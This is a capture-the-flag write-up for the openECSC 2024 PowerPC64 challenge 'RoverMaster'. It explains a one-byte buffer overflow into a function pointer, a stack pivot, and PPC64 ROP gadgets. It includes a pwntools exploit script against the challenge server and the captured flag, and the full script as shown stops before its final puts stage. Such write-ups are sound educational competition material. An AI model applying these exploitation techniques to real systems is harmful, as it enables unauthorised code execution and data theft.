Author: 0x6fe1be2

Version 27-03-24

# [openECSC](https://open.ecsc2024.it) (18.03-24.03)

## 🪐RoverMaster🪐

Status: first blooded 🩸 (0x6fe1be2)

Category: PWN

Points: 255 (10 Solves)

### TL;DR

🪐RoverMaster🪐 is a PowerPC64 (PPC64) pwn challenge with a one byte buffer overflow (BOF) vulnerability that can be abused to pivot the stack and build a ROP-chain. The hardest part of the challenge was understanding the PowerPC64 architecture and it's unique ROP Gadgets. 

### Intro

🪐RoverMaster🪐 is a PowerPC64 (PPC64) pwn challenge from the first round of openECSC 2024.

Description:

> 🪐 I'm giving you the keys for the art of mastering rovers... 🪐
>
> You can download the challenge files [here](https://cloud.cybersecnatlab.it/s/Po7sJdYCDdtwLjy).
>
> ```bash
> nc rovermaster.challs.open.ecsc2024.it 38007
> ```

the challenge files consist of a tar.gz archive that we extract to get the following files:

```
rovermaster/README.md
# deployment files for service
rovermaster/host/flag/
rovermaster/host/flag/.env 
rovermaster/host/docker-compose.yml
rovermaster/host/Dockerfile
rovermaster/host/run.sh
# qemu ppc64 cloud-image
rovermaster/host/debian-12-generic-ppc64el-20240211-1654.qcow2.ready
```



### Files

First of all we follow the instructions from the *README.md* to mount the file system locally and append our public key

```bash
sudo modprobe nbd max_part=8
sudo qemu-nbd --connect=/dev/nbd0 debian-12-generic-ppc64el-20240211-1654.qcow2.ready
mkdir ./mnt
sudo mount /dev/nbd0p1 ./mnt
echo "PUBLIC_KEY" | sudo tee -a ./mnt/root/.ssh/authorized_keys
sudo umount ./mnt
sudo qemu-nbd --disconnect /dev/nbd0
sudo rmmod nbd
```

>  Note: On my system I needed to modify the *run.sh* script to use `qemu-system-ppc64` instead of `qemu-system-ppc64le`.

we can now start the vm by executing *run.sh* and ssh to it using `ssh root@localhost -p 2222 -i $PATH_TO_KEYFILE`.

The first thing we will do is extract the binary `/root/powerpc/main` in order to reverse it, and look at some meta data.

```
> scp -P 2222 -i $PATH_TO_KEYFILE root@localhost:/root/powerpc/main ./main

> file ./main
./main: ELF 64-bit LSB executable, 64-bit PowerPC or cisco 7500, OpenPOWER ELF V2 ABI, version 1 (GNU/Linux), statically linked, BuildID[sha1]=497ee6f8ded126b012877d8d2cbdade822a8d0a5, for GNU/Linux 3.10.0, not stripped

> vagd info ./main
[*] './main'
    Arch:     powerpc64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x10000000)
[*] GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
```

The binary is static and non stripped, also no PIE so we won't need to find a leak for the exploit.

### Debug Environment

In order to create a debug environment we will be using the following tools and the provided vm.

* [GEF](https://github.com/hugsy/gef) (gdb plugin that supports PPC64)
* [vagd](https://github.com/gfelber/vagd) (my open source pwntools "plugin" I wrote for cross Distro / Kernel / Architecture binary exploitation)
* gdbserver (needs to be installed on the VM)

> Note: vagd probably was a huge contributor to me achieving first blood on this challenge

We create an exploit template for SSH in *exploit.py* using `vagd`

```bash
vagd template ./main rovermaster.challs.open.ecsc2024.it 38007 -e --ssh
```

And update it for our remote machine

```diff
70c70
<     vm = Shgd(exe.path, user='user', host='localhost', port=22, ex=True, fast=True)  # SSH
---
>     vm = Shgd(exe.path, user='root', host='localhost', port=2222, keyfile='PATH_TO_KEYFILE', ex=True, fast=True)  # SSH
```

After executing the script `./exploit.py`, we get prompted with the binary REPL.

Sadly pwntools uses `gdb` to find the correct binary so we modify the `PATH` to make `gdb` point to `ppc64le-elf-gdb` instead

```bash
ln -s /usr/bin/ppc64le-elf-gdb gdb
```

Now we can attach gdb to our binary for debugging and exploitation

```bash
PATH="$PWD:$PATH" ./exploit.py GDB
```

### Reversing (Ghidra)

Ghidra requires the user to choose the right archtecture for the binary, `Power ISA 3.0 Little Endian w/Altivec` worked best for me. Another notable gimmick is that for some reason Ghidra detects `func` and `.func` versions of the same function, whereas the `func` version executes a few instructions more, but this is more of an inconvenience than issue. 

### Code
#### Reversed Code: 
<details>

```c
// gcc main.c --no-pie -static -o main
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <unistd.h>

void cmd_get_planet(void);
void cmd_set_planet(void);
void cmd_get_name(void);
void cmd_set_name(void);
void cmd_move_rover(void);
void cmd_full_info(void);

struct rover {
    char weight;
    char x;
    char y;
    char z;
    char battery;
    char temperature;
    char planet[256];
    char name[256];
    void (*code)(void);
} typedef rover;

rover rovers[0xf] = {
    {0x96,0x00,0x00,0x00,0x19,0x64,"Mars","Curiosity 2.0", NULL},
    {0x78,0x0a,0x0f,0x01,0xf1,0x55,"Europa","Ice Explorer", NULL},
    {0xc8,0x14,0x05,0x00,0x82,0x4b,"Venus","Sulfur Trekker", NULL},
    {0x8c,0x05,0x14,0x00,0x0c,0x5a,"Titan","Methane Surfer", NULL},
    {0xa5,0x1e,0x0a,0x00,0x06,0x5f,"Pluto","Ice Miner", NULL},
    {0x82,0x00,0x19,0x00,0x2e,0x46,"Mercury","Solar Glider", NULL},
    {0xb4,0x0f,0x0f,0x00,0x78,0x50,"Neptune","Storm Navigator", NULL},
    {0x9b,0x19,0x00,0x00,0x14,0x41,"Moon","Lunar Walker", NULL},
    {0xbe,0x23,0x14,0x00,0x41,0x58,"Callisto","Ice Ranger", NULL},
    {0x6e,0x00,0x1e,0x00,0x3c,0x5c,"Venus","Cloud Dancer", NULL},
    {0xaf,0x28,0x05,0x00,0x01,0x4d,"Enceladus","Ice Fisher", NULL},
    {0xa0,0x0a,0x28,0x00,0x2d,0x53,"Mars","Dust Racer0", NULL},
    {0x91,0x14,0x19,0x00,0x51,0x4e,"Titan","Hydrocarbon Hunter", NULL},
    {0x82,0x2d,0x0a,0x00,0xf4,0x3c,"Io","Volcano Voyager", NULL},
    {0xaa,0x1e,0x23,0x00,0x5a,0x55,"Ganymede","Magnetic Mapper", NULL},
};
unsigned int current_rover = 0;

char *action_names[0x6] = {
    "Get Planet",
    "Set Planet",
    "Get Name",
    "Set Name",
    "Move rover",
    "Full info",
};
    
void (*actions[0x6])(void) = {
    cmd_get_planet,
	cmd_set_planet,
	cmd_get_name,
	cmd_set_name,
	cmd_move_rover,
	cmd_full_info
};

void die(char *msg)
{
  puts(msg);
  exit(1);
}

long long read_exactly(int fd, char *buf, size_t size)
{
  unsigned long long i = 0;
  size_t var;
  // BOF by 1
  do {
    if (size < i)
      return 0;
    var = read(fd,buf + i,1);
    if (var < 1)
      return -1;
    i = i + var;
  } while( true );
}

void cmd_get_planet(void)
{
  printf("Planet: %s\n",rovers[current_rover].planet);
}

void cmd_get_name(void)
{
  printf("Name: %s\n",rovers[current_rover].name);
}

void cmd_set_planet(void)
{
  int var;
  unsigned int size;
  printf("Send new planet size: ");
  var = scanf("%u",&size);

  if (var != 1) 
    die("err");

  if (0x100 < size) 
    die("Invalid planet len");

  printf("New planet: ");
  read_exactly(0,rovers[current_rover].name,size);
}

void cmd_set_name(void)
{
  int var;
  unsigned int size;
  printf("Send new name size: ");
  var = scanf("%u",&size);

  if (var != 1) 
    die("err");

  if (0x100 < size) 
    die("Invalid name len");

  printf("New name: ");
  read_exactly(0,rovers[current_rover].name,size);
}


void cmd_move_rover(void)
{
  int var;

  printf("Send coordinates (x y z): ");
  var = scanf("%hhu %hhu %hhu", &rovers[current_rover].x, &rovers[current_rover].y, &rovers[current_rover].z);
  if (var != 3)
    die("err");

  puts("Coordinates updated!");
}

void cmd_full_info(void)
{
  printf("Name: %s\n",rovers[current_rover].name);
  printf("Planet: %s\n",rovers[current_rover].planet);
  printf("Position (x, y, z): %hhu - %hhu - %hhu\n",
              rovers[current_rover].x,
              rovers[current_rover].y,
              rovers[current_rover].z);
  printf("Battery: %hhu%%\n",rovers[current_rover].battery);
  printf("Temperature: %hhu%%\n",rovers[current_rover].temperature);
  printf("Weight: %hhu%%\n",rovers[current_rover].weight);
}

int get_option(void)
{
  int var;
  int opt;
  puts("1. Choose rover");
  puts("2. Send cmd to rover");
  puts("3. Execute cmd on rover");
  printf("Option: ");
  var = scanf("%u",&opt);
  if (var != 1)
    die("err");
  return opt;
}


void opt_choose_rover(void)
{
  int var;
  unsigned int rover;
  puts("[Rover list]");
  puts("========================");
  for (int i = 0; i < 0xf; i = i + 1) {
    printf("[%d] %s\n",i,rovers[i].name);
  }
  puts("========================");
  printf("Choose the rover: ");
  var = scanf("%u",&rover);
  if (var != 1)
    die("err");
    
  if (0xe < rover)
    die("Invalid idx");
    
  current_rover = rover;
  puts("Rover selected!");
}


void opt_send_cmd(void)
{
  int var;
  unsigned int action_nmb;
  puts("[Action list]");
  puts("========================");
  for (int i = 0; i < 6; i = i + 1) {
    printf("[%d] %s\n",i,action_names[i]);
  }
  puts("========================");
  printf("Choose the action: ");
  var = scanf("%u",&action_nmb);
  if (var != 1)
    die("err");
  if (5 < action_nmb)
    die("Invalid idx");
      
  printf("Sending command: %s\n",action_names[action_nmb]);
  for (int j = 0; j < 10; j = j + 1) {
    printf(". ");
    usleep(100000);
  }
  puts("");
  rovers[current_rover].code = actions[action_nmb];
  puts("Done!");
}

void opt_execute_cmd(void)
{
  if (rovers[current_rover].code == NULL) {
    puts("Command not selected");
  }
  else {
    puts("Executing command on the rover....");
    rovers[current_rover].code();
    puts("Done!");
  }
}

void init(void)
{
    setvbuf(stdout,NULL,_IONBF,0);
    setvbuf(stdin,NULL,_IONBF,0);
  	setvbuf(stderr,NULL,_IONBF,0);
    // seccomp filter that only allows openat, read, write and clock_nanosleep
    puts("Init done!");
}

void main()
{
  int var;
  unsigned int opt;
  unsigned int joke_size;
  char joke [32];
  init();
  puts("Welcome to the Rover Management System. First of all, I need to verify you\'re an actual  human being. So, please, tell me a funny joke!");
  printf("Joke size: ");
  var = scanf("%u",&joke_size);
  if (var != 1)
    die("err");

  if (0x20 < joke_size)
    die("Invalid joke len");

  printf("Joke: ");
  read_exactly(0,joke,joke_size);
  puts("Hahaha! You\'re fun.");
    
  while(true) {
    opt = get_option();
    switch (opt) {
      case 1:
        opt_choose_rover();
        break;
      case 2:
        opt_send_cmd();
        break;
      case 3:
        opt_execute_cmd();
        break;
      default:
        die("Uknown option");
    }
  }
}
```
</details>

There is one obvious vulnerability in this code `read_exactly` overflows the read buffer by one. This allows us to overflow the `rover.name` buffer into the `rover.code`  function pointer inside `cmd_set_name` which can be used to get limited arbitrary code execution:

```c
long long read_exactly(int fd, char *buf, size_t size)
{
  unsigned long long i = 0;
  size_t var;
  // BOF by 1
  do {
    if (size < i)
      return 0;
    var = read(fd,buf + i,1);
    if (var < 1)
      return -1;
    i = i + var;
  } while( true );
}
```



### BOF Vulnerability

First let's define some helper functions that allow us to interact with the code:
<details>

```python
CHOOSE=1
SEND=2
EXEC=3

G_PLT=0
S_PLT=1
G_NA=2
S_NA=3
M_RO=4
F_INF=5

def joke(j, sz=None):
  if sz is None:
    sz = len(j)
  assert sz <= 0x20, 'joke to big'
  sla('Joke size:', sz)
  sla('Joke:', j)


def opt(o):
  sla('Option: ', o)

def choose(idx):
  assert idx < 0xf, 'rover idx to big'
  opt(CHOOSE)
  sla('rover: ', idx)

def send(cmd):
  opt(SEND)
  sla('action: ', cmd)

def exc():
  opt(EXEC)

def set_name(name, sz=None, oob=False):
  if sz is None:
    sz = len(name)
    if oob:
      sz -= 1

  assert sz <= 0x100, 'name to big'
  send(S_NA)
  exc()
  sla('size:', sz)
  if oob:
    sa('name:', name)
  else:
    sla('name:', name)

def set_planet(name, sz=None):
  if sz is None:
    sz = len(name)

  assert sz <= 0x100, 'planet to big'
  send(S_PLT)
  exc()
  sla('size:', sz)
  sla('planet:', name)

t = get_target()

# exploit goes here

it()
```

> Note: I use a lot of alias functions (`sla() -> t.sendlineafter()`), if you want the full list look at the start of the final exploit or generate a template using `vagd template`

</details>

Now we can try out the one byte BOF to get arbitrary code execution, i.e. by overwriting the `rover.code` function pointer into immediately returning

```python
t = get_target()

joke('BOF? Boffa theese ...')

choose(0)

# create bof
linfo('one byte BOF')
bof = flat(
  cyclic(0x100),
  p8(0x74) # blr -> immediatly return
)

set_name(bof, oob=True)
# arbitary code execution
exc()

it()
```

> Note: Please routinely check if your exploit code works on the remote server.

And it works, so what next? Luckily (or by design) there is this gadget within one byte of our address:

```assembly
10000e64 a0 00 3f 38     addi       r1,r31,0xa0   ; r1  = r31+0xa0
10000e68 10 00 01 e8     ld         r0,0x10(r1)   ; r0  = *(r1+0x10)
10000e6c a6 03 08 7c     mtspr      LR,r0         ; lr  = r0
10000e70 f8 ff e1 eb     ld         r31,0x8(r1)   ; r31 = *(r1+0x8)
10000e74 20 00 80 4e     blr                      ; branch to lr
...
; cmd_set_name()
10000e84 11 10 40 3c     lis        r2,0x1011

```

Even luckier this pivots the stack to the buffer allocated for our funny joke;

```python

linfo('write rop payload for later')
PAYLOAD_START = 0x10110116
rop = flat(
  0x6fe1be2, # r31
  cyclic(0x10),
  exe.sym.main, # ctr
)
joke(rop)
t = get_target()

# choose last rover for the bof vulnerability
choose(0xe)

linfo('one byte BOF')
bof = flat(
  cyclic(0x100),
  p8(0x64)   
)
set_name(bof, oob=True)

exc()

it()
```



### ROP in PPC64

Before we can start ROPing to victory, we must understand the registers and instructions used in PPC64, these are mostly taken from this [CheatSheet](https://zenith.nsmbu.net/wiki/Custom_Code/PowerPC_Assembly_Cheatsheet)

#### Registers

|                           Register                           | Name                                           | Attributes              | Bits | Purpose                                                      |
| :----------------------------------------------------------: | ---------------------------------------------- | ----------------------- | ---- | ------------------------------------------------------------ |
|                                                              |                                                |                         |      | **General Purpose Registers (GPRs)**                         |
|                              r0                              | GPR0                                           | Volatile + Cross-Module | 64   | General purpose, may be used by function linkage (Linux System Call number) |
|                            **r1**                            | GPR1                                           | Saved + Reserved        | 64   | Reserved for storing the stack frame pointer                 |
|                              r2                              | GPR2                                           | Reserved                | 64   | Reserved for usage by the system                             |
|                            **r3**                            | GPR3                                           | Volatile                | 64   | Stores 1st argument passed to function calls and their return value (Same for Linux System Call) |
|                         **r4 - r10**                         | GPR4 - GPR10                                   | Volatile                | 64   | Store from 2nd to 8th argument passed to function calls (Same for Linux System Call) |
|                          r11 - r12                           | GPR11 - GPR12                                  | Volatile + Cross-Module | 64   | General purpose, may be used by function linkage             |
|                             r13                              | GPR13                                          | Reserved                | 64   | Reserved for storing the small data area (SDA) pointer       |
|                          r14 - r30                           | GPR14 - GPR30                                  | Saved                   | 64   | General purpose, store generic integer values and pointers   |
|                           **r31**                            | GPR31                                          | Saved                   | 64   | Commonly used as stack base pointer                          |
|                                                              |                                                |                         |      | **Special Purpose Registers (SPRs)**                         |
|                           PC / IAR                           | Program Counter / Instruction Address Register | Internal                | 64   | Stores the address of the current instruction (Controlled by the CPU) |
|                              LR                              | Link Register                                  | Volatile                | 64   | Stores the return address for some of the branching instructions |
|                             CTR                              | CounT Register                                 | Volatile                | 64   | Stores the counter of loop iterations for most instructions  that perform loops. Also used for virtual function calls as it can  contain an address which can be branched to |
|                             MSR                              | Machine State Register                         | Special                 | 64   | Stores bits with information about the CPU and its current state |
| CR | Condition Register                             | Volatile / Saved        | 64   | Divided in 8 bitfields of 4 bits each to hold different kinds of conditions |

#### Instructions

Some of the instructions used in our gadgets:

| Instruction | Name                              | Parameters     | Pseudocode Equivalent | Additional Info                                              |
| ----------- | --------------------------------- | -------------- | --------------------- | ------------------------------------------------------------ |
|             |                                   |                |                       | **Integer Arithmetic Instructions**                          |
| `addi`      | ADD Immediate                     | `rA, rB, iX₁₆` | `rA = rB + iX`        | Adds the values of rB and iX together and stores the result in rA |
|             |                                   |                |                       | **Integer Comparison Instructions**                          |
| `or`        | OR operation                      | `rA, rB, rC`   | `rA = rB \| rC`        | Stores in rA the result of (rB \| rC)                        |
|             |                                   |                |                       | **Branch Instructions**                                      |
| `blr`       | Branch to Link Register           | *N/A*          | `return <r3 / f1>`    | Jumps from the current address to the address stored in LR This is essentially the **return** statement of a function, with  the value currently loaded into either r3 or f1 holding the returned  value, depending on if the return type is a fixed or floating point  value |
| `bctrl`     | Branch to CounT Register and Link |                |                       |                                                              |
|             |                                   |                |                       | **Move to/from Special Purpose Registers Instructions**      |
| `mtctr`     | Move To CounT Register            | `rA`           | `CTR = rA`            | Copies the value of rA into the CTR                          |
| `mtspr`     | Move To Special Purpose Register  | `SPR, rA`      | `SPRs[SPR] = rA`      | Copies the value of rA into the special purpose register SPR |
|             |                                   |                |                       | **Uncategorized instructions (categories WIP)**              |
| `ld`        | Load Doubleword                   | `rA, iX₁₆(rB)` | `rA = *(rB + iX)`     | Loads the value at the address (rB + iX) into rA.            |
|             |                                   |                |                       | **Misc. Instructions**                                       |
| `sc`        | System Call                       | `[iX₇]`        | *N/A*                 | Calls upon the system to perform a service identified by iX If iX is not provided, triggers a system call exception. |



#### Pivot

First we will need someway to execute a ROP chain that is longer than one instruction. We achieve this by pivoting the stack ptr (`r1`) into a user controlled section in memory. The global variable buffer used by the rover struct array `rovers` is a perfect target for a pivot.

Let's dump some gadgets:

```bash
ROPgadget --binary ./main > gadgets.txt
```

An we get this useful pivot gadget:

pivot gadget

```assembly
10000cf8 80 00 3f 38     addi       r1,r31,0x80  ; r1  = r31+0x80
10000cfc 10 00 01 e8     ld         r0,0x10(r1)  ; r0  = *(r1+0x10)
10000d00 a6 03 08 7c     mtspr      LR,r0	 ; lr  = r0
10000d04 f8 ff e1 eb     ld         r31,0x8(r1)  ; r31 = *(r1+0x8)
10000d08 20 00 80 4e     blr                     ; branch to lr
```

which we use to pivot to our user controlled global buffer:

```python
linfo('write rop payload for later')
# global buffer that contains the rover struct array
ROVERS = 0x10110110
# start of planet buffer of first rover
PAYLOAD_START = ROVERS+6 
pivot = flat(
  PAYLOAD_START-0x78, # r31
  cyclic(0x10),
  0x10000cf8, # ctr
)
joke(pivot)

linfo('prepare payload')
choose(0)
payload = cyc(0x100)
set_planet(payload)
```

and it works allowing us to write a payload into the rover global variable buffers:

```
$r0  : 0x6161616861616167 ("gaaahaaa"?)
$r1  : 0x000000001011011e  →  "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"
...
$r12 : 0x0000000010000e64  →  <cmd_set_planet+204> addi r1, r31, 160
...
$r31 : 0x6161616261616161 ("aaaabaaa"?)
$pc  : 0x6161616861616164 ("daaahaaa"?)
$cr  : [negative[0] positive[0] equal[0] overflow[0] less[7] greater[7] EQUAL[7] overflow[7]]
$lr  : 0x6161616861616167 ("gaaahaaa"?)
$ctr : 0x0000000010000e64  →  <cmd_set_planet+204> addi r1, r31, 160
─── stack ────
0x000000001011011e│+0x0000: "caaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoa[...]"    ← $r1
0x0000000010110126│+0x0008: "eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqa[...]"
0x000000001011012e│+0x0010: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
```



#### Payload

Before starting to write our payload we will create a helper functions that correctly writes our payload across multiple buffers.

```python
payload = flat(
  PAYLOAD_START, # r31
  cyc(0x10),
  0x6fe1be2, # execute this
)

rop_size = (len(payload)//0x100) + 1

payload += cyclic((0x100*rop_size)-len(payload))

assert len(payload) <= 0x1e00, 'payload to long'

lhex(rop_size, 'rop_size: ')

p = lprog('prepare payload')
for i in range(0, rop_size):
  p.status(f'{i}/{rop_size}')
  if i & 1 == 0:
    choose(i//2)
    set_planet(payload[i*0x100:(i + 1)*0x100])
  else:
    set_name(payload[i*0x100:(i + 1)*0x100])

p.success('start payload')

```

Now we can start with writing our ROP payload. If we look at the seccomp filters in the `init()` function at the start of `main()` we remember that only the `openat`, `read`, `wriite` and `clock_nanosleep` syscalls are allowed, limiting what payload can be created. Notable we will need to write a `openat -> read -> write` payload, so let's get started.

#### 1. Stage openat

In our first stage we will open our target file (in this case `./flag`), this translate to the following function call `open('./flag', O_RDONLY)` (`open` uses the `openat` syscall, not `open`), which means we will need control over the registers `r3` (first argument) and `r4` (second argument). 

For this we will use the following gadget:

```assembly
10022174 28 00 81 e8     ld         r4, 0x18(r1) ; r4  = *(r1+0x18)
10022178 20 00 61 e8     ld         r3, 0x20(r1) ; r3  = *(r1+0x20)
1002217c a6 03 89 7d     mtspr      CTR,r12      ; ctr = r12
10022180 21 04 80 4e     bctrl                   ; branch to ctr and set lr
```

So this gadgets basically makes us jump to r12, but we never set r12, so where do we jump?

Actually r12 is still set to our `rover.code` function from earlier, so we basically jump to our old stack pivot gadget used in the one byte BOF.

```assembly
; opt_execute_cmd
...
1000159c a6 03 89 7d     mtspr      CTR,r12 ; ctr = r12
100015a0 21 04 80 4e     bctrl              ; branch to ctr and set lr
```

Using these gadgets we can complete our first stage and open the flag to fd `3`

```python
# first stage open('flag', O_RDONLY)
payload = flat(
  PAYLOAD_START, # r31
  pad(b'./flag\0', 0x10), # file to open
  0x10022174, # set r3 r4
  cto('caaa'),
  PAYLOAD_START+8, #r3 (path)
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  0, #r4 (O_RDONLY)
  cyc(cfd('laab')-(cfd('eaaa')+8)),
  exe.sym.open+0x18 # skip prologue
)
```

You may notice that we don't use `exe.sym.open` but `exe.sym.open+0x18` instead. This is because the prologue and epilogue of the function actually create an infinite loop, because the function tries to return to `lr`, but `lr` points to the our gadget making us loop.

> Note: we don't directly jump to open using `ctr` but jump to `0x10000e64` set in `r12`, in this gadget we pivot using `lr`, therefore we loop.

#### 2.Stage read

The second stage definitely is the hardest one. Our goal is the recreate the following function call `read(FLAG_FD, BUFFER, count)`. So we will need control over the registers `r3-r5`.

We already have a gadget for `r3-r4`, but how will we set `r5`?

Well there is this on gadget that set's r5 to a sufficiently high value, but it doesn't immediately return, but creates an infinite loop instead (until SEGFAULT).

```assembly
100b2fb0 79 43 a5 7c     or.        r5,r5,r8   ; r5 = r5 | r8
; a bunch more code but returns to rl
```

So how do we fix this issue. If we remember the previous stage, we had a similar issue calling `exe.sym.open`. And if we look at the code execution we notice that the same issue occurs here, notable looping back to `lr`. So how can we circumvent this?

Previously we used this to set our registers `r3` and `r4`, but there is actually and insanely powerful instruction preceding our gadget (which wasn't even found by `ROPgadget`), `ld r12,0x18(r31)`:

```assembly
10022170 18 00 9f e9     ld         r12,0x18(r31) ; r12 = *(r31+0x18)
10022174 28 00 81 e8     ld         r4, 0x18(r1)  ; r4  = *(r1+0x18)
10022178 20 00 61 e8     ld         r3, 0x20(r1)  ; r3  = *(r1+0x20)
1002217c a6 03 89 7d     mtspr      CTR,r12       ; ctr = r12
10022180 21 04 80 4e     bctrl                    ; branch to ctr and set lr

; after blr in gadget
10022184 18 00 41 e8     ld         r2,0x28(r1)   ; r2  = *(r1+0x28)
10022188 40 00 21 38     addi       r1,r1,0x40    ; r1  = r1+0x40
1002218c 10 00 01 e8     ld         r0,0x10(r1)   ; r0  = *(r1+0x10)
10022190 f8 ff e1 eb     ld         r31,0x8(r1)   ; r31 = *(r1+0x8)
10022194 a6 03 08 7c     mtspr      LR,r0         ; lr  = r0
10022198 20 00 80 4e     blr                      ; branch to lr

```

This basically allows us to execute the `or. r5,r5,r8` gadget using the `ctr` register and then afterwards branching back to our previous gadget set in `rl`. Using this we can set the remaining registers `r3` and `r4` and read the flag into a known buffer. 

```python
# second stage read(3, BUFFER, count)
payload += flat(
  cto('iaaa'),
  PAYLOAD_START+len(payload)+0x80, # r31
  cto('eaaa'),
  0x10022170, # use ctr for branch (preserve lr)
  cto('waaa'),
  0x100b2fb0, # set r5 to high value (count)
  PAYLOAD_START+len(payload)+0x100, # r31
  cto('eaaa'),
  0x10022170, # set r3 r4 
  cto('caaa'),
  3, #r3 (flag fd)
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  PAYLOAD_START+0xf400, #r4 (buffer)
  cto('caaa'),
  PAYLOAD_START+len(payload)+0x180, # r31
  cyc(cfd('haaa')-(cfd('caaa')+4)),
  0x10000cf0,  # pivot stack 
  cyc(0x40-(cfd('haaa')+0xc)),
  exe.sym.read
)
```

> Note: because we directly jump to `read` using `bctrl` we don't need to skip prologue this time, because `rl` is set to the instruction after `bctrl`

#### 3.Stage puts

Lastly we will need to print out the flag, by calling the function `puts(BUFFER)`. This is easily done using our previous gadgets.

```python
# third stage puts(BUFFER)
payload += flat(
  cto('acba'),
  PAYLOAD_START+len(payload)+0x100, # r31
  cyc(cfd('acha')-(cfd('acba')+8)),
  0x10022170, # set r3 r4 again
  cto('caaa'),
  PAYLOAD_START+0xf400, #r3
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  0x6fe1be2, #r4
  cto('caaa'),
  exe.sym.puts
)
```

> Note: Initially i tried to leak the flag using `write(STDOUT_FILENO, BUFFER, count)`, but apparently `socaz` and `socat` won't allow this (this seems to happen because `count` is set way to high), even though it works locally, this seems to be a reoccurring issue with pwn challenges and i still have no idea why it happens.
### Exploit

Combining all three stages finishes our exploit and prints us the flag: `openECSC{r0pping_on_th3_rovers_l1ke_th3res_n0_t0morr0w_efb67db3}`

#### Full Exploit:
<details>

```python
#!/usr/bin/env python
from pwn import *

GDB_OFF = 0x555555554000
IP = 'localhost' if args.LOCAL else 'rovermaster.challs.open.ecsc2024.it'
PORT = 38007
BINARY = './main'
ARGS = []
ENV = {}
GDB = f"""
set follow-fork-mode parent

# b main

# exec cmd
b * 0x10022174
b * 0x100b2fb0
c"""

context.binary = exe = ELF(BINARY, checksec=False)
context.aslr = False

linfo = lambda x: log.info(x)
lwarn = lambda x: log.warn(x)
lerror = lambda x: log.error(x)
lprog = lambda x: log.progress(x)

byt = lambda x: x if isinstance(x, bytes) else x.encode() if isinstance(x, str) else repr(x).encode()
phex = lambda x, y='': print(y + hex(x))
lhex = lambda x, y='': linfo(y + hex(x))
pad = lambda x, s=8, v=b'\0', o='r': byt(x).ljust(s, v) if o == 'r' else byt(x).rjust(s, v)
padhex = lambda x, s: pad(hex(x)[2:], s, '0', 'l')
upad = lambda x: u64(pad(x))

gelf = lambda elf=None: elf if elf else exe
srh = lambda x, elf=None: gelf(elf).search(byt(x)).__next__()
sasm = lambda x, elf=None: gelf(elf).search(asm(x), executable=True).__next__()
lsrh = lambda x: srh(x, libc)
lasm = lambda x: sasm(x, libc)

cyc = lambda x: cyclic(x)
cfd = lambda x: cyclic_find(x)
cto = lambda x: cyc(cfd(x))

t = None
gt = lambda at=None: at if at else t
sl = lambda x, t=None: gt(t).sendline(byt(x))
se = lambda x, t=None: gt(t).send(byt(x))
sla = lambda x, y, t=None: gt(t).sendlineafter(byt(x), byt(y))
sa = lambda x, y, t=None: gt(t).sendafter(byt(x), byt(y))
ra = lambda t=None: gt(t).recvall()
rl = lambda t=None: gt(t).recvline()
rls = lambda t=None: rl(t)[:-1]
re = lambda x, t=None: gt(t).recv(x)
ru = lambda x, t=None: gt(t).recvuntil(byt(x))
it = lambda t=None: gt(t).interactive()
cl = lambda t=None: gt(t).close()


vm = None
def get_target(**kw):
  global vm

  if args.REMOTE:
    # context.log_level = 'debug'
    return remote(IP, PORT)

  if args.LOCAL:
    if args.GDB:
      return gdb.debug([exe.path] + ARGS, env=ENV, gdbscript=GDB, **kw)
    return process([exe.path] + ARGS, env=ENV, **kw)

  from vagd import Shgd, Box # only load vagd if needed
  if not vm:
    vm = Shgd(exe.path, user='root', host='localhost', port=2222, ex=True, fast=True)  # SSH
  if vm.is_new:
    log.info("new vagd instance") # additional setup here
  return vm.start(argv=ARGS, env=ENV, gdbscript=GDB, **kw)

CHOOSE=1
SEND=2
EXEC=3

G_PLT=0
S_PLT=1
G_NA=2
S_NA=3
M_RO=4
F_INF=5

def joke(j, sz=None):
  if sz is None:
    sz = len(j)
  assert sz <= 0x20, 'joke to big'
  sla('Joke size:', sz)
  sla('Joke:', j)


def opt(o):
  sla('Option: ', o)

def choose(idx):
  assert idx < 0xf, 'rover idx to big'
  opt(CHOOSE)
  sla('rover: ', idx)

def send(cmd):
  opt(SEND)
  sla('action: ', cmd)

def exc():
  opt(EXEC)

def set_name(name, sz=None, oob=False):
  if sz is None:
    sz = len(name)
    if oob:
      sz -= 1

  assert sz <= 0x100, 'name to big'
  send(S_NA)
  exc()
  sla('size:', sz)
  if oob:
    sa('name:', name)
  else:
    sla('name:', name)

def set_planet(name, sz=None):
  if sz is None:
    sz = len(name)

  assert sz <= 0x100, 'planet to big'
  send(S_PLT)
  exc()
  sla('size:', sz)
  sla('planet:', name)

t = get_target()

# stack pivot payload for later
PAYLOAD_START = 0x10110116
pivot = flat(
  PAYLOAD_START - 0x78,
  cyclic(0x10),
  0x10000cf8,  # pivot stack to payload
)

joke(pivot)


# first stage open('flag', O_RDONLY)
payload = flat(
  PAYLOAD_START, # r31
  pad(b'flag\0', 0x10), # file to open
  0x10022174, # set r3 r4
  cto('caaa'),
  PAYLOAD_START+8, #r3 (path)
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  0, #r4 (O_RDONLY)
  cyc(cfd('laab')-(cfd('eaaa')+8)),
  exe.sym.open+0x18
)

# second stage read(3, BUFFER, count)
payload += flat(
  cto('iaaa'),
  PAYLOAD_START+len(payload)+0x80, # r31
  cto('eaaa'),
  0x10022170, # use ctr for jmp (preserve lr)
  cto('waaa'),
  0x100b2fb0, # set r5 to high value (count)
  PAYLOAD_START+len(payload)+0x100, # r31
  cto('eaaa'),
  0x10022170, # set r3 r4 
  cto('caaa'),
  3, #r3 (flag fd)
  cyc(cfd('eaaa')-(cfd('caaa')+8)),
  PAYLOAD_START+0xf400, #r4 (buffer)
  cto('caaa'),
  PAYLOAD_START+len(payload)+0x180, # r31
  cyc(cfd('haaa')-(cfd('caaa')+4)),
  0x10000cf8,  # pivot stack 
  cyc(0x40-(cfd('haaa')+0xc)),
  exe.sym.read
)

